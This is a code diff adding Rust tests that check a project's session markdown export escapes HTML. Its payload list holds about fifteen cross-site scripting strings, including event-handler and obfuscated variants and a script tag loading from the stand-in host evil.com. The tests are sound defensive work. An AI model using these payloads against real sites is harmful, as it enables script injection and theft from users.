@@ -202,6 +202,116 @@ async fn test_session_message_xss_prevention() {
 }
 
 #[tokio::test]
+async fn test_session_message_xss_various_payloads() {
+    let xss_payloads = vec![
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "<iframe src=javascript:alert('XSS')>",
+        "<body onload=alert('XSS')>",
+        "<input onfocus=alert('XSS') autofocus>",
+        "<select onchange=alert('XSS')><option></select>",
+        "<style>@import javascript:alert('XSS')</style>",
+        "javascript:alert('XSS')",
+        "<script src=http://evil.com/malicious.js></script>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<ScRiPt>alert('XSS')</sCrIpT>",
+        "<script>alert(/XSS/.source)</script>",
+        "<`><script>alert(String.fromCharCode(88,83,83))</script>",
+        "<img src=\"x\" alt=\"`onerror=alert('XSS')>\">",
+    ];
+
+    for payload in xss_payloads {
+        let mut session = Session::new();
+        session.add_message(opencode_core::message::Message::user(payload.to_string()));
+
+        let md_export = session.export_markdown();
+        assert!(
+            md_export.is_ok(),
+            "Export should succeed for payload: {}",
+            payload
+        );
+        let md = md_export.unwrap();
+
+        let lower_md = md.to_lowercase();
+        let has_unescaped_script_tag =
+            lower_md.contains("<script") || lower_md.contains("</script");
+        let has_unescaped_tag_with_event = (lower_md.contains("<img")
+            && lower_md.contains("onerror="))
+            || (lower_md.contains("<svg") && lower_md.contains("onload="))
+            || (lower_md.contains("<input") && lower_md.contains("onfocus="))
+            || (lower_md.contains("<body") && lower_md.contains("onload="))
+            || (lower_md.contains("<select") && lower_md.contains("onchange="));
+
+        assert!(
+            !has_unescaped_script_tag && !has_unescaped_tag_with_event,
+            "XSS payload should be sanitized: {}\nMarkdown: {}",
+            payload,
+            md
+        );
+    }
+}
+
+#[tokio::test]
+async fn test_session_message_html_tag_stripping() {
+    let mut session = Session::new();
+    let html_content = "<h1>Hello</h1><p>World</p><script>malicious()</script>";
+    session.add_message(opencode_core::message::Message::user(
+        html_content.to_string(),
+    ));
+
+    let md_export = session.export_markdown();
+    assert!(md_export.is_ok());
+    let md = md_export.unwrap();
+
+    assert!(
+        !md.contains("<h1>") && !md.contains("</h1>"),
+        "HTML tags should be escaped or stripped"
+    );
+    assert!(
+        !md.contains("<p>") && !md.contains("</p>"),
+        "HTML tags should be escaped or stripped"
+    );
+    assert!(
+        !md.contains("<script>") && !md.contains("</script>"),
+        "Script tags should be escaped or stripped"
+    );
+}
+
+#[tokio::test]
+async fn test_session_message_sanitization_edge_cases() {
+    let edge_cases = vec![
+        ("<script>", "&lt;script&gt;"),
+        ("</script>", "&lt;/script&gt;"),
+        ("<img src=x>", "&lt;img src=x&gt;"),
+        ("onerror=", "onerror="),
+        ("javascript:", "javascript:"),
+        ("<svg onload=a>", "&lt;svg onload=a&gt;"),
+    ];
+
+    for (input, _expected_sanitized) in edge_cases {
+        let mut session = Session::new();
+        session.add_message(opencode_core::message::Message::user(input.to_string()));
+
+        let md_export = session.export_markdown();
+        assert!(
+            md_export.is_ok(),
+            "Export should succeed for edge case: {}",
+            input
+        );
+        let md = md_export.unwrap();
+
+        if input.contains("<script") || input.contains("</script") {
+            assert!(
+                !md.contains("<script") && !md.contains("</script"),
+                "Script tags should not appear directly in output for: {}",
+                input
+            );
+        }
+    }
+}
+
+#[tokio::test]
 async fn test_tool_registry_execute_rejects_dangerous_paths() {
     let registry = ToolRegistry::new();
     registry.register(ReadTool::new()).await;
